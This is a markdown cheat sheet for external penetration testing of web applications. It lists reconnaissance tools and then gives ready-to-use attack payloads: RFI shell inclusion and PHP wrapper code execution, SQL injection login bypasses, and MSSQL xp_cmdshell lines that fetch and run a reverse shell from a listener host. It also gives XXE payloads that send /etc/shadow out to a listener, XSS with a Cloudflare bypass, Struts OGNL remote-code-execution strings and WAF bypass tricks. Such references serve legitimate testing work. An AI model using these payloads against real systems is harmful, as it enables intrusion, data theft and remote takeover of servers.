# External Penetration Testing

## **Automated tools**

### [httpx](https://github.com/projectdiscovery/httpx) 

Web prober for fast discovery

```bash
# Install httpx
GO111MODULE=on go get -v github.com/projectdiscovery/httpx/cmd/httpx && httpx -version

# Usage 
httpx -l hosts.txt -silent -title -content-length -status-code
subfinder -d <target> -silent | httpx -title -content-length -status-code -silent
```

### [Nuclei](https://github.com/projectdiscovery/nuclei)

Full scanner based on templates

```bash
# Install Nuclei
GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei; nuclei -version
nuclei -l urls.txt -t 'cves/CVE-2020*'
```

### [Sn1per](https://github.com/1N3/Sn1per)

Full scanner including many other tools

```bash
# Install Sn1per
docker run -it xerosecurity/sn1per /bin/bash
sniper -t <target>

# Manual install
git clone https://github.com/1N3/Sn1per && cd Sn1per && bash install.sh && sniper --help
```

### [Autorecon](https://github.com/Tib3rius/AutoRecon)

Full scanner

```bash
# Install AutoRecon
wget https://raw.githubusercontent.com/Tib3rius/AutoRecon/master/Dockerfile && docker build -t tib3rius/autorecon .
docker run -it -v ~/results:/results --rm --name autorecon-container tib3rius/autorecon --help

# Manual install pipx
sudo apt update && sudo apt install -y python3 python3-pip python3-venv seclists curl enum4linux gobuster nbtscan nikto nmap onesixtyone oscanner smbclient smbmap smtp-user-enum snmp sslscan sipvicious tnscmd10g whatweb wkhtmltopdf
python3 -m pip install --user pipx && python3 -m pipx ensurepath
pipx install git+https://github.com/Tib3rius/AutoRecon.git && autorecon --help

# Manual install python3
git clone https://github.com/Tib3rius/AutoRecon.git && cd AutoRecon && python3 -m pip install -r requirements.txt && cd src/autorecon/ && python3 autorecon.py --help
```

### [Legion](https://github.com/carlospolop/legion)

Full scanner

```bash
# Manual install (as root)
git clone https://github.com/carlospolop/legion.git /opt/legion && cd /opt/legion/git && ./install.sh && mv /usr/bin/legion /usr/bin/legion2 && ln -s /opt/legion/legion.py /usr/bin/legion && legion
```

### Kali pre-installed

```bash
nikto -C all -output nikto.html -host <target> 
```

--- 

## **Passive discovery**

dork on domain

```bash
inurl:example.com intitle:"index of"
inurl:example.com intitle:"index of /" "*key.pem"
inurl:example.com ext:log
inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git

example.com site:pastebin.com
# search for leaks on pastebin, dehashed, raidforums, snusbase, leakedsource, etc.
```

get url in file

```bash
cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
curl http://<target>/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

get js script

```bash
go get github.com/tomnomnom/waybackurls
waybackurls <target> | grep "\.js" | uniq | sort
```

---

## **Active discovery**

### Services

```bash
nmap -sS -sV -O --top-ports 1000 --script=banner,nse,http-head -oA top_1000 <target>
nmap -sT -sV -O -p- -oA full_scan <target>
nmap -sU -sV --top-ports 1000 --open -oA udp_1000 <target>
```

---

### Subdomains

```bash
amass enum -ip -brute -active -d <domain> 

gobuster dns -i  -w subdomains.txt -d <domain> 
```

check if subdomain exist

```bash
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

---

### Vhosts

```bash
nmap --script http-vhosts -p 80,8080,443 <target>

gobuster vhost -u <target> -w common-vhosts.txt

wfuzz  --hh 0  -H 'Host: FUZZ.<target_domain>' -u http://<target_ip> --hc 400 -w /usr/share/wordlists/wfuzz/general/common.txt -c

# adding new vhost to /etc/hosts
echo -e "<target_ip>\t<target_domain>" >> /etc/hosts
```

---

### Urls

```bash
feroxbuster -u http://<target>/ --proxy socks5://127.0.0.1:5555 -x html,txt,sql,php

dirsearch -u <target> -e php,html,js,xml -x 500,403

wfuzz -c -z file,/root/wordlist.txt --hc 404 <target>/FUZZ
wfuzz -c -z file,/root/wordlist.txt --hc 404 --hl 0 <target>/FUZZ

gobuster dir -u https://<target> -w ~/wordlists/shortlist.txt -l -v
gobuster fuzz -u https://<target>/?FUZZ=test -w parameter-names.txt
```

URL finder

```bash
wget -qO- https://stackoverflow.com/ | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u
```
link finder

```bash
https://github.com/GerbenJavado/LinkFinder
python linkfinder.py -i https://<target> -d -o cli
```

Directory listing recustive dump

```bash
wget -r --no-parent http://<target>/dir
```

Find asset and params

```bash
assetfinder <target> | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
```

---

### Manual upload

```bash
curl -i -X PUT -H "Content-Type: application/xml; charset=utf-8" -d @"/tmp/some-file.xml" http://<target>/newpage
```

---

## **Common attacks**

### All Injections 

```bash
)‘“'"`<u>testocd${7*6}{{7*5}} 
```

### LFI

Local file inclusion fuzzing

```bash
wfuzz -c -w <lfi.txt> --hw 0 <target>?page=../../../../../../../FUZZ
```

Getting shell from RFI

```bash
<target>?page=http://<listener_ip>/shell.php
<target>?page=\\<listener_ip>\<shared_folder>\shell.php
```

**PHP wrapper**

- PHP Expect

```bash
<target>?page=expect://whoami
```

- PHP data
- 
```bash
<target>?=data:text/plain,<?php echo shell_exec("whoami") ?>
```

- PHP Input 

Using a proxy like Burp, change the request to a POST request and use the wrapper "php://input", then put your php code into the request body :

```php
POST <targeturi>/<vulnrable_paramter>=php://input
Host: <target>

<?php phpinfo(); ?>
```

**access_log**

If you find the access log, you can make a GET request with your php code :
```php
GET <targeturi>/<vulnrable_paramter>=<?php phpinfo(); ?>
Host: <target>

GET <targeturi>/<vulnrable_paramter>=/var/log/apache2/access.log
Host: <target>
```

**proc/self/environ**

Send the payload into User-Agent, and browse the /proc/self/environ file :

```bash
GET <target>?page=../../../proc/self/environ HTTP/1.1
User-Agent: <?php phpinfo(); ?>
```

---

### SQLI

**SQL Injection**

Bypass authentication

```bash
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

Fuzzing parameter

```bash
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'   <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```

Oracle Union based

```bash
tt'
tt' ORDER BY 4--
tt' ORDER BY 3--
tt' UNION SELECT NULL,(select banner from v$version where rownum=1),NULL from DUAL--
tt' UNION SELECT NULL,(select ora_database_name from dual),NULL from DUAL--
tt' UNION SELECT NULL,table_name,NULL from all_tables--
tt' UNION SELECT NULL,column_name,NULL from all_tab_columns where table_name='WEB_ADMINS'--
tt' UNION SELECT NULL,ADMIN_NAME||PASSWORD,NULL from 'WEB_ADMINS'--
```

MSSQL Union based

```bash
toto' UNION SELECT TABLE_NAME,NULL FROM information_schema.TABLES--
toto' UNION SELECT column_name,NULL FROM information_schema.COLUMNS--
toto' UNION SELECT pass,NULL FROM users--
toto' UNION SELECT name,NULL FROM users--
toto'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;-- toto';EXEC xp_cmdshell 'certutil -urlcache -f http://<listener_ip>/revshell.exe c:\windows\temp\revshell.exe';-- toto';EXEC xp_cmdshell 'c:\windows\temp\revshell.exe';--
```

MSSQL shell

```bash
enable_xp_cmdshell; EXEC xp_cmdshell 'whoami'
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--;EXEC xp_cmdshell 'whoami'
```

---

### XXE

XML External Entities

- [full list of payloads](https://gist.github.com/staaldraad/01415b990939494879b4)

```bash
# Vanilla, used to verify outbound xxe or blind xxe
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://<listener_ip>:443/test.txt">
]>
<r>&sp;</r>

# OoB extraction
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % data3 SYSTEM "file:///etc/shadow">
<!ENTITY % sp SYSTEM "http://<listener_ip>:<port>/sp.dtd">
%sp;
%param3;
%exfil;
]>

## External dtd: ##
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://<listener_ip>:<port>/%data3;'>">
```

---

### SSRF

[ssrfuzz](https://github.com/ryandamour/ssrfuzz)

```bash
go get -u github.com/ryandamour/ssrfuzz

echo "http://<target>" | ssrfuzz scan
echo "http://<target>/test.php?u=" | go run main.go scan
cat file_of_domains.txt | ssrfuzz scan
ssrfuzz scan -d file_of_domains.txt
```

---


### XSS

Cross-Site Scripting

```bash
<svg/onload=prompt(1000)>

test+(<script>prompt(1000)</script>)@example.com
test@example(<script>prompt(1000)</script>).com
"<script>alert(1000)</script>"@example.com

# CloudFlare bypass
<svg onload=alert%26%230000000040"1")>
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
```


---


### SSTI

Server Side Template Injection

```bash
{{8*8}}
${9*9}
#{6*6}
<%= 5 * 5 %>

"<%= 7 * 7 %>"@example.com 
test+(${{7*7}})@example.com
```

---

### ELI

Expression Language Injection

```bash
# J2EEScan detection vector
https://www.example.url/?vulnerableParameter=PRE-${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.print(new java.lang.Integer(829+9)),#kzxs.close(),1?#xx:#request.toString}-POST&INJPARAM=HOOK_VAL

# Blind detection vector
https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@java.lang.Thread@sleep(10000),1?#xx:#request.toString}

# RFI
https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=new java.io.FileInputStream(#wwww),#qqqq=new java.lang.Long(#wwww.length()),#tttt=new byte[#qqqq.intValue()],#llll=#pppp.read(#tttt),#pppp.close(),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(new java.lang.String(#tttt)),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=/etc/passwd

# DIR LIST
https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=#wwww.listFiles(),#qqqq=@java.util.Arrays@toString(#pppp),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#qqqq),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=..

# RCE LINUX
https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=@java.lang.Runtime@getRuntime(),#ssss=new java.lang.String[3],#ssss[0]="/bin/sh",#ssss[1]="-c",#ssss[2]=#parameters.INJPARAM[0],#wwww.exec(#ssss),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=touch /tmp/InjectedFile.txt

# RCE WINDOWS
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```

---

## **Bypass WAF**


SSRF localhost

```bash
http://127.1/
http://0000::1:80/
http://[::]:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
```

X-Header

```bash
Accept: application/json, text/javascript, */*; q=0.01 
Host : localhost
X-Originating-IP: IP
X-Forwarded-For: IP
X-Remote-IP: IP
X-Remote-Addr: IP
X-Client-IP: IP
X-Host: IP
X-Forwared-Host: IP
```

NullByte

```bash
file.jpg%00shell.php
shell.php%00file.jpg
shell.php%00.jpg
```

---

## **Burp Extenders**

Extension|Description
---|----
`Retire.js`|[find vulnerable JavaScript libraries](https://github.com/PortSwigger/retire-js)
`Autorize`|[find privileges escalations by replaying admin requests as a simple user](https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f)